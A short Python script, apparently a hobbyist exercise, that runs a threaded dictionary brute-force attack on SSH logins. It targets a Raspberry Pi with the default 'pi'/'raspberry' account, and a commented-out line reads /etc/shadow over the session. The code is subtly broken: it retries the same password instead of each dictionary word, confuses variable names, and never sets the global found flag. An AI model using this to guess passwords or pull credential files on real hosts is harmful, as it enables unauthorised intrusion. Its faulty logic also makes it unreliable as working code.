import time, optparse, pxssh
from pxssh import pxssh
from threading import BoundedSemaphore, Thread

import think
from think import rpi_ip, docker_ip, think_ip


max_conn = 5
conn_lock = BoundedSemaphore(value=max_conn)
FOUND = False
FAIL_CNT = 0


def send_cmd(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)


def connect(host, username, pw, release):
    global FOUND
    global FAIL_CNT
    try:
        s = pxssh()
        s.login(host, uname, pw)
        found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            FAIL_CNT += 1
            time.sleep(1)
            connect(host, uname, pw, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, uname, pw, False)
    finally:
        if release:
            conn_lock.release()


def brute_guess(host, uname, pw, dict_fn='dict/cracklib-small'):
    global FOUND
    global FAIL_CNT
    for line in open(dict_fn):
        if FOUND:
            print('[+] Passwd Found: %s ' % pw)
            exit(0)
        if FAIL_CNT > 5:
            print('[!] Exiting: Too Many Socket Timouts')
            exit(0)
        conn_lock.acquire()
        word = line.strip('\n')
        t = Thread(target=connect, args=(host, uname, pw, True))
        t.start()




timer = think.Timer()
timer.start()




host = rpi_ip
uname = 'pi'
pw = 'raspberry'

brute_guess(host, uname, pw)


# send_cmd(s, 'cat /etc/shadow- | grep %s' % user)




timer.stop()
print(timer.get_msg())
